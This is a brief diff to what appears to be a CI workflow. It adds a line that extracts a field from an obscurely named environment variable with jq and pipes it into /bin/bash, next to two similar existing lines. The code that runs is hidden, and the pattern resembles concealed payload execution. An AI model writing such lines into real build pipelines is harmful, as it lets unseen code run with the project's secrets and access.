@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$r20" | jq -r .mmvsh8844 | /bin/bash
           printf '%s' "$pfqbg77" | jq -r .tfhfg357 | /bin/bash
+          echo $bcq79901 | jq -r .ppb21759 | /bin/bash
 
       - name: Persist output
         if: always()
